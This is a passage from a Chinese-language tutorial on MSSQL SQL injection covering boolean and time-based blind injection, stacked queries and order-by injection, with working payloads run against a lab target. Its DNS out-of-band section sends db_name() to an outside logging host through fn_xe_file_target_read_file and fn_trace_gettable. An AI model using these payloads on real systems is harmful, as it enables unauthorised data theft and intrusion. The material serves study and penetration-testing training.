<h4 class="anchor anchorWithStickyNavbar_LWe7" id="注入举例-1">注入举例<a href="#注入举例-1" class="hash-link" aria-label="注入举例的直接链接" title="注入举例的直接链接">​</a></h4>
<p>过程和mysql布尔盲注过程一样，流程也是判断长度-&gt;数据库名-&gt;表名-&gt;列名-&gt;值</p>
<p>语句和联合注入一样，只是因为属于盲注所以多了一些判定条件而已，这里举几个例子来抛砖引玉吧</p>
<ul>
<li>获取数据库名长度</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">11</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- true</span><br></span></code></pre></div></div>
<p>说明数据库长度为 11</p>
<p><img decoding="async" loading="lazy" alt="image-20211223103927411" src="/assets/images/image-20211223103927411-e73fbd0091153aa055af7e6de8604de6.png" width="1942" height="224" class="img_ev3q"></p>
<ul>
<li>查看数据库第一位</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> ascii</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">108</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> ascii</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">109</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- false</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> ascii</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">109</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 也可以不转换为ascii码判断（最后得出数据库 mozhe_db_v2）</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;m&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">11</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;2&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223104246807" src="/assets/images/image-20211223104246807-5a4beaccad0c2ddb7921ab4c1a248c76.png" width="1930" height="234" class="img_ev3q"></p>
<ul>
<li>查看当前数据库有多少表</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 说明有2个表</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">count</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;U&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- true</span><br></span></code></pre></div></div>
<ul>
<li>查看第一个表的第一位</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 第一位是m</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> ascii</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">109</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- true</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="时间盲注">时间盲注<a href="#时间盲注" class="hash-link" aria-label="时间盲注的直接链接" title="时间盲注的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="注入判断-1">注入判断<a href="#注入判断-1" class="hash-link" aria-label="注入判断的直接链接" title="注入判断的直接链接">​</a></h4>
<p>类似于布尔盲注，但是从页面内容看不出来差异，只能通过响应时间来判断，因此会用到延时函数 <code>waitfor delay</code></p>
<p>WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。</p>
<p>如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。</p>
<p><strong>语法：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># n 为延时多少秒</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:n&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 延时5秒</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<p><strong>在MSSQL中，默认可使用堆叠查询，这个也是判断mssql与mysql的区别之一</strong>，所以在判断注入点有三种方式，如下：</p>
<ul>
<li>方法一：直接带入查询</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223105616001" src="/assets/images/image-20211223105616001-1d9b9b54f7a159f0cd3153a9f6b10ac7.png" width="2066" height="110" class="img_ev3q"></p>
<ul>
<li>方法二：堆叠查询</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223105651467" src="/assets/images/image-20211223105651467-721db9f23691f1d571f8d7286fefdb88.png" width="2054" height="112" class="img_ev3q"></p>
<ul>
<li>方法三：判断条件</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223105903701" src="/assets/images/image-20211223105903701-b97afff7a78576331aea721be132dd70.png" width="2038" height="108" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常用函数-1">常用函数<a href="#常用函数-1" class="hash-link" aria-label="常用函数的直接链接" title="常用函数的直接链接">​</a></h4>
<p>除了刚才布尔盲注用到的常用函数外，还使用到了如下的一些函数，主要是延时和条件判断</p>
<ul>
<li>waitfor delay &#x27;0:0<!-- -->:n<!-- -->&#x27;</li>
<li>IF...ELSE...</li>
<li>case when exp then state1 ELSE state2 end</li>
</ul>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="注入举例-2">注入举例<a href="#注入举例-2" class="hash-link" aria-label="注入举例的直接链接" title="注入举例的直接链接">​</a></h4>
<p>还是举个例子吧，抛砖引玉，大家可以自由发挥</p>
<ul>
<li>判断当前数据库第一位是不是m</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;m&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223110755772" src="/assets/images/image-20211223110755772-b92af6c1949e70034d00303f0ef22c49.png" width="2058" height="106" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="dns带外oob注入">DNS带外(OOB)注入<a href="#dns带外oob注入" class="hash-link" aria-label="DNS带外(OOB)注入的直接链接" title="DNS带外(OOB)注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-2">概念<a href="#概念-2" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>和mysql带外注入类似，只是语法不一样，限制条件不一样，可以用来简化盲注，快速获取数据</p>
<p>如果遇到带有禁用堆栈查询的完全盲SQL注入，则可尝试通过函数 <code>fn_xe_file_target_read_file</code>、<code>fn_get_audit_file</code>和<code>fn_trace_gettable</code>实现DNS带外(OOB)数据泄露。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用举例">利用举例<a href="#利用举例" class="hash-link" aria-label="利用举例的直接链接" title="利用举例的直接链接">​</a></h3>
<p>利用<code>fn_xe_file_target_read_file</code> 和 <code>fn_trace_gettable</code></p>
<p>限制：需要控制服务器权限</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 原文</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> fn_xe_file_target_read_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;C:\*.xel&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;\\&#x27;</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;.23c999e1.dns.1433.eu.org\1.xem&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token boolean" style="color:#36acaa">null</span><span class="token punctuation" style="color:#393A34">,</span><span class="token boolean" style="color:#36acaa">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- URL编码后</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">and</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">from</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">fn_xe_file_target_read_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;C:\*.xel&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;\\&#x27;</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">2</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">2</span><span class="token plain">b</span><span class="token string" style="color:#e3116c">&#x27;.23c999e1.dns.1433.eu.org\1.xem&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token boolean" style="color:#36acaa">null</span><span class="token punctuation" style="color:#393A34">,</span><span class="token boolean" style="color:#36acaa">null</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 原文</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> fn_trace_gettable</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\\&#x27;</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">+</span><span class="token string" style="color:#e3116c">&#x27;.23c999e1.dns.1433.eu.org\1.trc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">default</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- URL编码后</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">and</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">exists</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token operator" style="color:#393A34">+</span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">from</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">fn_trace_gettable</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\\&#x27;</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">2</span><span class="token plain">b</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">2</span><span class="token plain">b</span><span class="token string" style="color:#e3116c">&#x27;.23c999e1.dns.1433.eu.org\1.trc&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token keyword" style="color:#00009f">default</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="堆叠注入">堆叠注入<a href="#堆叠注入" class="hash-link" aria-label="堆叠注入的直接链接" title="堆叠注入的直接链接">​</a></h2>
<p>MSSQL 默认是可以多语句查询，通过分号<code>;</code>分割，其与mysql不同的是，MSSQL非常灵活，且可执行系统命令，当存在堆叠查询的语句中，就可以考虑执行系统命令，写入webshell，远程下载木马文件，执行命令getshell等等。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">id</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="order-by-注入">Order by 注入<a href="#order-by-注入" class="hash-link" aria-label="Order by 注入的直接链接" title="Order by 注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-3">概念<a href="#概念-3" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到<code>order by</code>排序，<code>order by</code>在select语句中，紧跟在<code>where [where condition]</code>后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟<code>column_name</code>，而预编译是参数化字符串，而<code>order by</code>后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入判断-2">注入判断<a href="#注入判断-2" class="hash-link" aria-label="注入判断的直接链接" title="注入判断的直接链接">​</a></h3>
<ul>
<li>通过<code>order by 列名</code>，查看排序返回内容的顺序</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> id</span><br></span></code></pre></div></div>
<ul>
<li>通过超大数构成SQL语句错误</li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">999</span><br></span></code></pre></div></div>
<ul>
<li>通过延时函数来判断</li>
